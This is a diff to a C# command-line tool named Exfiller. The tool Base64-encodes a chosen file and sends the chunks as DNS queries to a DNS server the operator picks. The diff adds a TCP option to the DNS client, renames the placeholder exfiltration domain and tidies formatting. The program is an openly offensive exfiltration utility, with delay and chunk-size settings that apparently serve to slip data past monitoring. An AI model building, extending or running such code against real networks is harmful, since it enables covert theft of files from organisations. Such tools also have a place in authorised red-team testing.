@@ -23,6 +23,9 @@ namespace Exfiller
 			[Option('p', "dns-port", Required = false, Default = 53, HelpText = "Target DNS Port (Defaults to 53).")]
 			public int DNSPort { get; set; }
 
+			[Option('P', "protocol", Required = false, Default = "UDP", HelpText = "Protocol to use, UDP or TCP (Defaults to UDP)")]
+			public String DNSProtocol { get; set; }
+
 			[Option('d', "delay", Required = false, Default = 0, HelpText = "Delay (in milliseconds) between each request.")]
 			public int Delay { get; set; }
 
@@ -52,18 +55,31 @@ namespace Exfiller
 					System.Environment.Exit(1);
 				}
 			}
-			
+
 
 
 			// Setup DNSClient variables using command line argument as the target DNS server
 			String targetDNSServer = opts.DNSServer.ToString();
 			int targetDNSPort = opts.DNSPort;
 			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), targetDNSPort);
-			var client = new LookupClient(endpoint);
+			var client = new LookupClient();
+			if (opts.DNSProtocol == "TCP")
+            {
+				client = new LookupClient(endpoint)
+				{
+					UseTcpOnly = true
+				};
+			} else
+            {
+				client = new LookupClient(endpoint);
+
+			}
+			
+
 
 			// Setup other variables from command line options
 			// Target domain to append Base64 encoded data to.  This doesn't really matter and doesn't need to be valid
-			String targetDomain = ".test.local";
+			String targetDomain = ".supersecret.notreal";
 			var targetFile = opts.TargetFile.ToString();
 			var delayTime = opts.Delay;
 			var requestLength = opts.Length;
@@ -78,7 +94,7 @@ namespace Exfiller
 				Stopwatch stopwatch = new Stopwatch();
 				stopwatch.Start();
 
-				int totalRequests = b64File.Length/requestLength+2;
+				int totalRequests = b64File.Length / requestLength + 2;
 
 				// Loop over Base64 data and send the defined number of characters at a time as a DNS request appended to the provided domain
 				// Example #1: aaaaaaaaaaaaaaaaaaaaa.test.local
@@ -106,7 +122,7 @@ namespace Exfiller
 					// This might behave weirdly or print multiple times depending on the delay time
 					if ((int)(stopwatch.Elapsed.TotalMilliseconds) % 300000 <= 40)
 					{
-						Console.WriteLine($"\n[*] {counter} requests sent in {((int)stopwatch.Elapsed.TotalSeconds)/60} minutes...");
+						Console.WriteLine($"\n[*] {counter} requests sent in {((int)stopwatch.Elapsed.TotalSeconds) / 60} minutes...");
 					}
 
 					Thread.Sleep(delayTime);
@@ -130,12 +146,12 @@ namespace Exfiller
 				{
 					Console.WriteLine($"\n[*] Time elasped: {seconds} seconds");
 				}
-				
+
 
 				////
 				// The below can be used for troubleshooting to convert the Base64 back the orignal data if needed
 				////
-				
+
 				//b64File = b64File.Replace("-", "=");
 				//Byte[] b64FileBytes = Convert.FromBase64String(b64File);
 				//String originalFile = Encoding.Default.GetString(b64FileBytes);
